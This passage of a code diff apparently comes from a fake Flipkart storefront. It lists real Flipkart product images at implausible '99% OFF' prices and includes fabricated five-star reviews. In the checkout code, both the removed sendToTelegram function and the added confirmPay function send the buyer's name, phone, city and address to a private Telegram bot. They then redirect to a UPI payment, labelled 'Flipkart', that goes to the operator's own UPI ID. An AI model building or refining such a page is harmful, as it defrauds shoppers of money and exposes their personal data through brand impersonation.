"https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/a/0/-original-imahf9qjpcms7n9p.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/q/q/-original-imahf9qjba2bgyt6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/a/x/-original-imahf9qjjhhhavmf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/e/l/-original-imahf9qjxykhkpvx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/k/c/-original-imahf9qj95gzhuzx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/k/r/-original-imahf9qjynp5njcy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/0/g/s/-original-imahf9qje4quyysu.jpeg?q=70&crop=false"] },
+            { id: 132, name: "Noise Aura Buds with Dual Device Pairing, 60 Hours of Playtime, and ENC with Quad Mic Bluetooth  (Aura White, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/f/f/r/-original-imagzzh2w3wzxuzt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/i/g/-original-imahyx2upujyhxkt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/8/d/-original-imahyx2u7uwk8guc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/y/g/-original-imahyx2u3cdj6bhr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/u/i/-original-imahyx2urure8gbr.jpeg?q=70&crop=false"] },
+            { id: 133, name: "CMF by Nothing Buds 2 48 dB Hybrid ANC, Ultra Bass Technology 2.0, 55 Hrs playtime Bluetooth  (Orange, In the Ear)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/b/v/-original-imahe29hx7dunuvp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/x/d/-original-imahe29hqvcvddzd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/j/x/-original-imahe29h8xspjvbf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/g/g/-original-imahe29h4afpdhmg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/x/m/-original-imahe29hgu3fus7s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/i/m/-original-imahe29hbzec5d57.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/4/g/-original-imahe29hmcm3uanb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/l/e/-original-imahe29hrygagyeh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/y/1/-original-imahe29hggnxvyyx.jpeg?q=70&crop=false"] },
+            { id: 134, name: "realme Buds T200x with 25dB ANC,12.4mm Dynamic Bass Drivers,48Hrs Playback, BT5.4, IP55 Bluetooth  (Pure Black, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/a/i/-original-imahcyy3c5dyfgjt.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/b/j/-original-imahcyy3k5xymzzy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/8/y/-original-imahcyy3mh9qr7te.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/a/p/-original-imahcyy3cw3ehhva.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/h/2/-original-imahcyy3caqxhrvc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/i/p/-original-imahcyy3wv6hehzd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/t/v/-original-imahcyy3hf2teh4g.jpeg?q=70&crop=false"] },
+            { id: 135, name: "realme Buds Wireless 2 with Dart Charge and Active Noise Cancellation (ANC) Bluetooth Gaming  (Grey, In the Ear)", price: 299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/krayqa80/headphone/v/k/q/rma2009-realme-original-imag54f5hsazzk99.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krayqa80/headphone/d/z/m/rma2009-realme-original-imag54f5hxeufhyj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krwec280/headphone/v/u/v/rma2009-realme-original-imag5hg8vgzemazk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/l/c/2/rma2009-realme-original-imag58xtr8eyzpzu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/g/m/s/rma2009-realme-original-imag58xth2f2dgah.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/n/f/m/rma2009-realme-original-imag58xt3kdwfkye.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krgohow0/headphone/x/j/b/rma2009-realme-original-imag58xtzsgz5c96.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/krwec280/headphone/v/u/v/rma2009-realme-original-imag5hg8vgzemazk.jpeg?q=70&crop=false"] },
+            { id: 136, name: "realme Buds Air7 with 52dB ANC, 12.4mm Driver, 52hrs Playback, IP55 & 45ms Low Latency Bluetooth  (Ivory Gold, True Wireless)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/0/t/n/-original-imahaumhdxxgaxzw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/8/q/-original-imaha7jmzufgxphn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/v/t/-original-imaha7jmybvhztaz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/z/n/p/-original-imaha7jmjhgv5zsr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/1/x/b/-original-imaha7jmvc4dkujm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/x/n/q/-original-imaha7jmhhfhgxfg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/v/w/-original-imaha7jmbvrarzfq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/7/e/-original-imaha7jmgsqyvxxv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/l/d/-original-imaha7jmx3ucmh8s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/b/q/i/-original-imaha7jmg3d8ppzf.jpeg?q=70&crop=false"] },
+            { id: 137, name: "BAJAJ New Shakti 5HD HA Handi With IB 5 L Inner Lid Induction Bottom Pressure Cooker  (Hard Anodized)", price: 299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/p/d/c/-original-imagsd29ysfvkw2x.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/n/z/v/-original-imagzu8artvzyazd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/k/5/f/-original-imagzu8apkuujwpf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/n/z/v/-original-imagzu8artvzyazd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/w/z/f/-original-imagzu8aczfc8chv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/o/q/e/-original-imagzu8ascnjuqw7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/l/b/5/no-1-tr007-treon-original-imah4w26qhkx8pqb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/p/6/o/no-1-tr007-treon-original-imah4w26zsdj9q23.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/v/l/p/yes-1-steelcraft-classic-cooker-2ltr-inlid-nirlon-original-imah4qgzdpf2uesh.jpeg?q=70&crop=false"] },
+            { id: 138, name: "Fastrack Revoltt X2 with 1.91 BT Calling|Rotating Crown|60 Hz Refresh Rate|Fast Charge Smartwatch  (Black Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/t/g/b/-original-imahfmpuafyzda6y.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/i/b/l/-original-imahfmpuhbc5tn9b.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/9/l/l/-original-imahfmpufngyu9ku.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/9/l/l/-original-imahfmpufngyu9ku.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/e/s/o/-original-imahfmpug8v6g8tf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/9/l/l/-original-imahfmpufngyu9ku.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/6/2/-original-imahfmpur9khwpvz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/p/4/-original-imahfmpu2gyvg6up.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/2/g/-original-imahfmpuqr87hfys.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/z/s/h/-original-imahfmpuytatgaaz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/2/g/-original-imahfmpuqr87hfys.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/i/c/u/-original-imahfmpumyyqzzcr.jpeg?q=70&crop=false"] },
+            { id: 139, name: "OnePlus Nord Buds 3r TWS Earbud, 10min charge for 8hr Music, 3D Audio, 2-mic call Bluetooth  (Ash Black, True Wireless)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/q/2/-original-imahfsg7qtke8kpf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/t/v/-original-imahfsg7g6g8sach.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/c/p/v/-original-imahf9dazdk6sqxd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/y/x/-original-imahf9daqcftfrzm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/f/o/-original-imahf9dafdggz4yu.jpeg?q=70&crop=false"] },
+            { id: 140, name: "Prestige Atlas Plus Toughened top with Lighter Knife and Hose Pipe Glass Manual Gas Stove  (3 Burners)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/t/j/r/-original-imah3yzbjjvdzjmh.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/128/128/xif0q/gas-stove/v/x/0/-original-imahj8yeyqzyvsm3.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/gas-stove/0/p/j/-original-imahj8yeztzxtfnc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/m/5/j/-original-imahj8yeb5uxfpws.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/h/i/9/-original-imahj8yersgcvfyt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/t/r/s/-original-imahj8yepxzphah6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/gas-stove/z/b/q/-original-imahj8yeztkjfxnh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/h/3/t/2-lpg-7-8-2-burner-hob-sq-ps-auto-hornbills-automatic-70-original-imah4svvxpxdhfmp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/j/k/b/4-lpg-9-14-4-burner-ms-frame-3d-ps-auto-hornbills-automatic-63-5-original-imah4sptgxnzpzae.jpeg?q=70&crop=false"] },
+            { id: 141, name: "BLOWHOT Emerald Auto Ignition Heavy Tornado Brass Toughened Glass Top, 2 Year Warranty Glass, Iron Automatic Gas Stove  (3 Burners)", price: 399, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/n/g/u/3-lpg-6-2-emerald-blowhot-9-5-automatic-original-imahhuxesygdsnjq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/z/a/m/3-lpg-6-2-emerald-blowhot-9-5-automatic-original-imahhuxenjugubfh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/z/a/x/3-lpg-6-2-emerald-blowhot-9-5-automatic-original-imahhuxegffgkbkx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/gas-stove/w/g/h/3-lpg-6-2-emerald-blowhot-9-5-automatic-original-imahhuxezrpzj4tk.jpeg?q=70&crop=false"] },
+            { id: 142, name: "Prestige Popular Svachh 3 L Outer Lid Pressure Cooker  (Hard Anodized)", price: 349, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/s/y/q/no-1-20335-prestige-original-imahghhzd8eg2zqq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/w/s/g/no-1-20335-prestige-original-imahghhz9myxxb3p.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/pressure-cooker/k/f/e/no-1-20335-prestige-original-imahghhzcr6abpvu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/r/j/8/no-1-20335-prestige-original-imahghhzfyj8sh9z.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/a/a/q/no-1-20335-prestige-original-imahghhzs7hcmywr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/p/o/n/no-1-20335-prestige-original-imahghhzykfwwhue.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/p/c/q/no-1-20335-prestige-original-imahghhz2zpsnprd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/r/2/k/no-3-10039-prestige-original-imahgkj9nk7ksqeg.jpeg?q=70&crop=false"] },
+            { id: 101, name: "BAJAJ KTX 1.8 L DLX Electric Kettle  (1.8 L, Black, Silver)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/electric-kettle/t/k/x/ktx-1-8-l-dlx-ktx-1-8-l-dlx-bajaj-original-imah8j7nvuhcfs6z.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/electric-kettle/7/s/y/ktx-1-8-l-dlx-ktx-1-8-l-dlx-bajaj-original-imah8j7nurke9hz9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/electric-kettle/w/g/4/ktx-1-8-l-dlx-ktx-1-8-l-dlx-bajaj-original-imah8j7ncymsdjwd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/electric-kettle/l/p/0/ktx-1-8-l-dlx-ktx-1-8-l-dlx-bajaj-original-imah8j7nvzsfhpg3.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/electric-kettle/d/t/g/ktx-1-8-l-dlx-ktx-1-8-l-dlx-bajaj-original-imah8j7ns6pekgkg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/electric-kettle/l/p/0/ktx-1-8-l-dlx-ktx-1-8-l-dlx-bajaj-original-imah8j7nvzsfhpg3.jpeg?q=70&crop=false"] },
             { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] },
             { id: 103, name: "AirPods Pro (2nd Generation)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] },
             { id: 101, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"] },
             { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] },
-            { id: 103, name: "AirPods Pro (2nd Generation)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] },
-            { id: 101, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"] },
-            { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] }
+            { id: 103, name: "AirPods Pro (2nd Generation)", price: 449, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] }
            
         ];
 
-        function loadProducts() {
+        let sel = null; let swpHome, swpDet;
+
+        function init() {
             const grid = document.getElementById('main-grid');
             products.forEach(p => {
-                grid.innerHTML += `
-                    <div class="bg-white p-2 shadow-sm rounded" onclick="openProduct(${p.id})">
-                        <img src="${p.imgs[0]}" class="h-32 w-full object-contain mb-2">
-                        <p class="text-xs font-medium truncate">${p.name}</p>
-                        <div class="flex items-center gap-1 mt-1">
-                            <span class="font-bold text-sm">₹${p.price}</span>
-                            <span class="text-green-600 text-[10px] font-bold">99% OFF</span>
-                        </div>
-                    </div>
-                `;
+                grid.innerHTML += `<div class="bg-white p-3 border shadow-sm" onclick="openProduct(${p.id})"><img src="${p.imgs[0]}" class="h-32 mx-auto object-contain"><p class="text-xs mt-2 line-clamp-2">${p.name}</p><p class="font-bold">₹${p.price}</p><p class="text-green-600 text-[10px] font-bold">99% Off</p></div>`;
             });
+            swpHome = new Swiper(".home-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: { delay: 3000 } });
         }
-
-        function openProduct(id) {
-            const p = products.find(x => x.id == id);
-            selectedProductPrice = p.price;
-            selectedProductName = p.name;
-            document.getElementById('det-name').innerText = p.name;
-            document.getElementById('det-price').innerText = "₹" + p.price;
-            
-            document.getElementById('detail-img-wrapper').innerHTML = p.imgs.map(img => `<div class="swiper-slide"><img src="${img}" class="h-full w-full object-contain"></div>`).join('');
-            
-            document.getElementById('reviews-container').innerHTML = `
-                <div class="border-b pb-2"><p class="font-bold">5 ★ Mind-blowing!</p><p class="text-gray-600">Best deal ever on Flipkart.</p></div>
-                <div class="border-b pb-2"><p class="font-bold">5 ★ Must buy!</p><p class="text-gray-600">Great quality, original product delivered.</p></div>
-            `;
-
-            showPage('page-detail');
-            new Swiper(".detailSwiper", { pagination: { el: ".swiper-pagination" } });
-        }
-
-        async function checkPincode(pin) {
-            if(pin.length === 6) {
-                document.getElementById('pin-loader').classList.remove('hidden');
-                try {
-                    const res = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
-                    const data = await res.json();
-                    if(data[0].Status === "Success") {
-                        document.getElementById('uCity').value = data[0].PostOffice[0].District;
-                        document.getElementById('uState').value = data[0].PostOffice[0].State;
-                    }
-                } catch(e) {}
-                document.getElementById('pin-loader').classList.add('hidden');
-            }
-        }
-
-       async function sendToTelegram() {
-            const name = document.getElementById('uName').value;
-            const phone = document.getElementById('uPhone').value;
-            const pin = document.getElementById('uPin').value;
-            const city = document.getElementById('uCity').value;
-            const house = document.getElementById('uHouse').value;
-
-            if(!name || phone.length < 10) return alert("Sahi detail bharein!");
-
-            document.getElementById('payBtn').innerText = "Processing...";
-
-            const msg = `📦 *ORDER RECEIVED* 📦\n\n👤 *User:* ${name}\n📞 *Phone:* ${phone}\n🛍️ *Item:* ${selectedProductName}\n💰 *Price:* ₹${selectedProductPrice}\n📍 *Pin:* ${pin}\n🏙️ *City:* ${city}\n🏠 *Addr:* ${house}`;
-
-            // --- Yahan se Error Fix Hai ---
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-                });
-                
-                // Success hone par payment pe bhejo
-                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR&mode=02&purpose=00&orgid=159761`;
-                
-            } catch(e) {
-                // Agar net ki wajah se error aaye tab bhi payment pe bhejo
-                window.location.href = `upi://pay?pa=${MY_UPI_ID}&pn=Flipkart&am=${selectedProductPrice}&cu=INR&mode=02&purpose=00&orgid=159761`;
-            }
-        } // Ye wala bracket function band karta hai
 
         function showPage(id) {
-            document.getElementById('page-home').classList.add('hidden');
-            document.getElementById('page-detail').classList.add('hidden');
-            document.getElementById('page-address').classList.add('hidden');
+            ['page-home', 'page-detail', 'page-address', 'page-payment'].forEach(p => document.getElementById(p).classList.add('hidden'));
             document.getElementById(id).classList.remove('hidden');
             window.scrollTo(0,0);
         }
 
-        window.onload = () => {
-            loadProducts();
-            new Swiper(".banner-swiper", { pagination: { el: ".swiper-pagination" }, autoplay: true });
-        };
+        function openProduct(id) {
+            sel = products.find(p => p.id === id);
+            document.getElementById('det-name').innerText = sel.name;
+            document.getElementById('det-price').innerText = "₹" + sel.price;
+            
+            const sW = document.getElementById('swiper-images');
+            const fS = document.getElementById('full-stack-images');
+            sW.innerHTML = ''; fS.innerHTML = '';
+
+            sel.imgs.forEach(url => {
+                sW.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
+                fS.innerHTML += `<img src="${url}">`;
+            });
+
+            showPage('page-detail');
+            if(swpDet) swpDet.destroy();
+            swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
+        }
+
+        async function fetchPin(pin) {
+            if(pin.length === 6) {
+                document.getElementById('load').classList.remove('hidden');
+                try {
+                    const r = await fetch(`https://api.postalpincode.in/pincode/${pin}`);
+                    const d = await r.json();
+                    if(d[0].Status === "Success") {
+                        document.getElementById('uCity').value = d[0].PostOffice[0].District;
+                        document.getElementById('uState').value = d[0].PostOffice[0].State;
+                    }
+                } catch (e) {}
+                document.getElementById('load').classList.add('hidden');
+            }
+        }
+
+        function goToPayment() {
+            if(document.getElementById('uName').value && document.getElementById('uPhone').value) {
+                showPage('page-payment');
+            } else alert("Fill all details");
+        }
+
+        function confirmPay() {
+            const n = document.getElementById('uName').value;
+            const msg = `🔥 *ORDER ALERT* 🔥\n\nItem: ${sel.name}\nPrice: ₹${sel.price}\n\n👤 Name: ${n}\n📞 Phone: ${document.getElementById('uPhone').value}\n📍 City: ${document.getElementById('uCity').value}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
+        }
+
+        init();
     </script>
 </body>
-</html>
+</html>  
 
